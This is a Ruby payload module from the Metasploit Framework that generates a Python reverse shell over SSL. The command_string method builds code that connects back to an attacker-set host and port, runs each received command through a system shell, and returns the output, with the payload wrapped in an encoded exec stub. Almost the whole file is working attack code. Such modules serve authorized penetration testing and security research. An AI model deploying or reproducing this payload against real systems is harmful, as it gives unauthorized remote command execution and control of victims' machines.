##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Payload::Python
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Command Shell, Reverse TCP SSL (via python)',
        'Description' => 'Creates an interactive shell via Python, uses SSL, encodes with base64 by design. Compatible with Python 2.6-2.7 and 3.4+.',
        'Author' => 'RageLtMan <rageltman[at]sempervictus>',
        'License' => BSD_LICENSE,
        'Platform' => 'python',
        'Arch' => ARCH_PYTHON,
        'Handler' => Msf::Handler::ReverseTcpSsl,
        'Session' => Msf::Sessions::CommandShell,
        'PayloadType' => 'python',
        'Payload' => {
          'Offsets' => {},
          'Payload' => ''
        }
      )
    )
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    cmd  = "import socket as s,subprocess as r\n"
    cmd += "so=s.socket(2,1)\n"
    cmd += "so.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))\n"
    cmd += py_ssl_wrap_socket('so')
    cmd += "while True:\n"
    cmd += "\td=so.recv(1024)\n"
    cmd += "\tif len(d)==0:\n\t\tbreak\n"
    cmd += "\tp=r.Popen(d.decode('utf-8'),shell=True,stdin=r.PIPE,stdout=r.PIPE,stderr=r.PIPE)\n"
    cmd += "\to=p.stdout.read()+p.stderr.read()\n"
    cmd += "\tso.sendall(o)\n"
    py_create_exec_stub(cmd)
  end
end
